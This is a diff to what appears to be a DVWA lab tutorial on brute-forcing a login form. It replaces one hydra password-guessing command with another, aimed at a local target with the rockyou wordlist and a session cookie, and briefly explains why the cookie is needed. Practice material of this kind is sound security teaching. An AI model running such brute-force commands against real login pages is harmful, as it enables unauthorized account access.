@@ -46,7 +46,7 @@ On submitting the username and password we see that it is using get request
 So let’s use hydra for brute force:
 
 ``` 
-hydra -l admin -P /root/Desktop/test-list.txt -o /root/Desktop/brute-attack.txt 192.168.56.101 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
 ```
 
 Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page
